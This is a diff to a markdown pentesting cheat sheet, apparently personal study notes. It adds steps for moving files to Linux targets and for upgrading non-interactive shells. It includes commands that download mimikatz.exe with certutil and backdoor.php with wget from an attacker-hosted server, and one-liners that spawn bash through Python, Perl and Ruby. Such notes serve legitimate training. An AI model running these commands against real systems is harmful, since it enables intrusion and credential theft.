@@ -1463,9 +1463,23 @@ With an anonymous null session you can access the IPC$ share and interact with s
   - we can use the "certutil -urlcache -f http://x.x.x.x/mimikatz.exe mimikatz.exe" (In this example we are downloading mimikatz.exe from a python webserver)
   
   ### Transferring Files to Linux targets
+  - we can use tmux if we only have one shell and cannot create tabs! You can create new tabs (ctrl+b, then c) and switch tabs with ctrl+b number
+  - then we can use python to host a webserver on the source
+  - we can download a file using "wget http://x.x.x.x/backdoor.php"
   
   
-  
+  ## Shells
+  ### Upgrading Non-Interactive shells
+  - Easiest way to identify if it's a non-interactive shell is it won't provide a "prompt" (root@xxx:)
+  - bash session: /bin/bash -i
+  - remember: a bash shells doesn't need to be installed!!
+  - list all shells on the target: cat /etc/shells (you can choose one here, most common is "/bin/bash" or "bin/sh"
+  - check is python is installed: python --version
+    - spawn a python pty session: python -c 'import pty; pty.spawn("/bin/bash")'
+  - check if perl is installed: perl --help
+    - perl -e 'exec "/bin/bash";'
+  - check if ruby is installed
+    - ruby: exec "/bin/bash"
   
   
   
